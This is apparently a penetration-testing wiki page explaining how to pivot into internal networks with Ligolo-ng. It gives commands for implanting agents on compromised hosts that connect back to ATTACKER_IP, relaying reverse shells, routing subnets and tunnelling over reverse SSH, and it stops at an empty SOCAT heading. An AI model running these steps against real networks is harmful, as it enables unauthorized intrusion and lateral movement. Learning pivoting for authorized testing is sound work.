---
description: >-
  Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to
  establish tunnels from a reverse TCP/TLS connection using a tun interface
  (without the need of SOCKS).
---

# Ligolo-Ng

Ligolo-Ng is a unique pivoting tool that allows you to create VPN-like tunnels, enabling direct interaction via target IP addresses instead of using socks proxies. With an interactive CLI interface, you can easily jump from one agent to another without any hassle.

Ligolo-Ng has two parts: a proxy that acts as a C2 interface to locate and select your targets, and also enables listeners on the target machine; and an agent that you implant on the target machine to initiate the VPN connection from the target machine to the attacking machine.&#x20;

The agent does not require higher privileges on the target machine, so you can use a classic reverse shell to simplify any attacking methodology. With Ligolo-Ng, you can run any tool from your attacking machine against a target machine by closing the network gap between layers of networks.

{% embed url="https://github.com/tnpitsecurity/ligolo-ng" %}
Latest link in github to download ligolo-ng
{% endembed %}

<figure><img src="../../.gitbook/assets/Untitled Diagram.jpg" alt=""><figcaption><p>A classic scenario for pivoting use cases</p></figcaption></figure>

### Setting up Ligolo-ng

{% hint style="info" %}
Before running Ligolo-ng, you must create a TUN Interface on the attacker PC so that ligolo can add routes to different sub networks. The idea is that when you have a sub network such as \`192.168.0.0/24\` that is inside the tartget network, you can provide the sub network IP address (which can only be reached from an internal network) to any tool you want.
{% endhint %}

`Creating a Tun Interface`

```
# Before running ligolo-ng proxy, you must create a tuntap virtual interface
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

<details>

<summary>ligolo-setup-script</summary>

```
#!/bin/bash
me="$(whoami)"
echo "addling ligolo routes to user: $user"

echo "creating the ligolo tun interface"
sudo ip tuntap add user "$me" mode tun ligolo 
sudo ip link set ligolo up

echo "now adding routes $a $b"
a="172.16.0.0/24"
b="192.168.0.0/24"
c="10.10.0.0/24"
sudo ip route add "$a" dev ligolo
echo "done : $a"
sudo ip route add "$b" dev ligolo
echo "done : $b"
sudo ip route add "$c" dev ligolo
echo "done : $c"

echo "good luck! :)"
```

</details>

Once you have added the TUN Interface and the sub networks that you want to access from the attacker PC, you can now launch ligolo proxy on the attacker PC and the agent on an already compromised host in the internal network.

`Connecting to a Ligolo-Agent`

```
# 1. On the attacking machine :
./proxy -selfcert -laddr 0.0.0.0:9901

# 2. On each compromised host with the network that you want to pivot to
./agent -connect ATTACKER_IP:9901
```

### Agent Binding/Listening

`Agent Binding/listening on ligolo allows you to capture reverse shells from an internal network and forward it through the ligolo connection. You can then launch a netcat/pwncat-cs from the attacking machine seamlessly, give you the impression as if you were already in the target network.`

## Ligolo-Ng Pivoting Tutorials / Use Cases

### 1. Accessing the Target Network

Once a connection is establised on the Public Facing Server that is in the Target Network via a reverse shell, it is possible to access/enumerate or exploit any vulnerabilities against a different target in the same network trough ligolo (such as a DMZ) or a target that is in a neighbouring network (in the case of a non-segmented network). This allows an attcker to use their very own tools from the attacking machine.

{% hint style="info" %}
The following method works only when the Target Network has direct access to the attacking machine network, such as in a local network, via port forwarding or a VPN connection. More advanced pivoting techniques will be detailed below.
If the attacking machine is in a NAT network, then, port forwarding should implemented.
{% endhint %}

```
# 1. Follow the ligolo setup process and start the ligolo proxy on the attacking machine 
./proxy -selfcert -laddr 0.0.0.0:9901

# 2. Add a ip route on the attacker machine that will route the target sub network via the ligolo TUN interface
sudo ip route add 192.168.0.0/24 dev ligolo

# 3. Transfer the ligolo agent binary to the compromised target via wget/scp/pwncat-cs

# 4. Initiate a connection from the ligolo agent to the ligolo proxy
./agent -connect ATTACKER_IP:9901

# 5. On ligolo, select the agent that you have deployed on the compromised target (ligolo agent)

# 6. Once selected, type : 
start

//This will now route the sub network 192.168.0.0 via the ligolo TUN interface and through the ligolo tunnel
//Allowing you to use any tool from the attacking maching against the new target machine
```

![image](https://user-images.githubusercontent.com/90450439/221353322-0abc5b8e-01dd-491a-b3f7-0a3b050393ac.png)

### 1.1 Forwarding a reverse shell from the Target Network

Using the Ligolo's Agent Binding/Listening feature, it is possible to recieve a reverse shell connection from a target (in the Target Network) that does not have direct access to the attacking machine (ie. an internet/WAN access). An agent in a compromised server that can communicate with the target can also act as a listner, thus allowing to forward reverse shells through the ligolo tunnel back to the attacking machine.

```
# 1. Establish an agent in the Public Facing server via ligolo agent

# 2. On the ligolo proxy (on the attacking machine), select the agent

# 3. Provide the following command
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:8899 --tcp

# 4. Launch netcat/pwncat-cs on the attacker machine to recieve the reverse shell

//Flags : --addr 0.0.0.0:1234 (the listener IP and port on the compromised server)
//Flags : --to 127.0.0.1:8899 (the netcat/pwncat-cs listner on the attackers machine)
```

{% hint style="info" %}
In the following example, The reverse shell is initiated from the machine 192.168.0.10 in the target network that do not have direct access to the Attacker machine but to the Public Facing Server. When configuring the reverse shell, the connection must be directed to the Public Facing Server's IP address as it is were the ligolo agent will start it's listner that was initiated via listner_add.
{% endhint %}

![image](https://user-images.githubusercontent.com/90450439/221354631-dbcb392f-af06-49d8-a63c-c5c03201c2cd.png)

### 1.2. Accessing the Internal Network 

It is also possible to implant ligolo agents into deeper levels of the network in an organization inorder to compromise additional servers/devices. This follows the simmilar steps that were described for the Public Facing Server. However, this requires once again a reverse shell in the Internal Network or other sorts of foothold as a low privileged user in the internal network. 

```
# 2. Add a ip route on the attacker machine that will route the target sub network via the ligolo TUN interface
sudo ip route add 10.10.0.0/24 dev ligolo

# 3. Transfer the ligolo agent binary to the compromised target via wget/scp/pwncat-cs

# 4. Initiate a connection from the ligolo agent to the ligolo proxy
./agent -connect ATTACKER_IP:9901

# 5. On ligolo, select the agent that you have deployed on the compromised target (ligolo agent)

# 6. Once selected, type : 
start

//This will now route the sub network 10.10.0.0 via the ligolo TUN interface and through the ligolo tunnel
//Allowing you to use any tool from the attacking maching against the new target machine
```
![image](https://user-images.githubusercontent.com/90450439/224545307-05571c12-31a9-41b7-b8cc-8b4365336e77.png)

### 2. Pivoting Ligolo-Ng with SSH access

In the case where the Target Network as well as the Internal Network has no possibility to contact the attacking machine but via a SSH connection, it is possible to initiate a connection from a ligolo agent implanted in the Public Facing Server via a SSH Reverse tunnel. 

To do this, you will first have to initiate a Reverse SSH Connection. This is mainly because the ligolo proxy always listens to connections that are first initiated by the ligolo agent. A reverse ssh connection will allow us to open a port within the Public Facing Server and whatever that connects to that perticular port will then be tunnled trough the SSH connection.

```
//Initiate a Reverse ssh connection to the target server

ssh -R 7878:127.0.0.1:1337 user@target_server_ip
```
![image](https://user-images.githubusercontent.com/90450439/224557695-01ad05f3-a9ca-4456-ac94-246f2b3f5228.png)

Once the ssh tunnel is established, now you can transfer the ligolo agent and run the ligolo agent from the target server, simmilar to the steps shown above..

{% hint style="info" %}
The following method allows only a single ligolo agent connection. Due to the nature of the port mapping that is provided in the SSH reverse connection, once a ligolo agent "occupies" a port, it is not possible to use another ligolo agent on the same port. 
{% endhint %}
```
//On the attacking machine 
./proxy -selfcert -laddr 127.0.0.1:1337

//On the target machine 
./agent -connect 127.0.0.1:7878 -ignore-cert
```
![image](https://user-images.githubusercontent.com/90450439/224558041-d257541d-a8f5-4fdd-9450-e4ef64ae4489.png)

### 2.1 Pivoting Ligolo-Ng with SSH access + SOCAT

